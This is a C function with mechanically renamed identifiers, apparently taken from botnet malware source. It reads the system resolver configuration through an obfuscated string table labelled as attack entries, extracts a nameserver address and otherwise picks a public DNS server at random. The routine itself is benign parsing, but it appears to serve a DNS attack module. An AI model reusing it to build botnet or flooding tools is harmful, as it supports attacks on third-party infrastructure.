#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  resolvbuf ;
typedef  int /*<<< orphan*/  ipv4_t ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  FUNC0 (int,int,int,int) ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  TABLE_ATK_NSERV ; 
 int /*<<< orphan*/  TABLE_ATK_RESOLVER ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*) ; 
 int FUNC5 () ; 
 int FUNC6 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*,int) ; 
 int FUNC11 (char*,int,int /*<<< orphan*/ ) ; 

__attribute__((used)) static ipv4_t FUNC12(void)
{
    int fd;

    FUNC9(TABLE_ATK_RESOLVER);
    fd = FUNC3(FUNC8(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    FUNC7(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = FUNC6(fd, resolvbuf, sizeof (resolvbuf));
        FUNC1(fd);
        FUNC9(TABLE_ATK_NSERV);
        nspos = FUNC11(resolvbuf, ret, FUNC8(TABLE_ATK_NSERV, NULL));
        FUNC7(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                // Skip leading whitespace
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                // End if c is not either a dot or a number
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    FUNC10(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found)
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return FUNC2(ipbuf);
            }
        }
    }

    switch (FUNC5() % 4)
    {
    case 0:
        return FUNC0(8,8,8,8);
    case 1:
        return FUNC0(74,82,42,42);
    case 2:
        return FUNC0(64,6,64,6);
    case 3:
        return FUNC0(4,2,2,2);
    }
}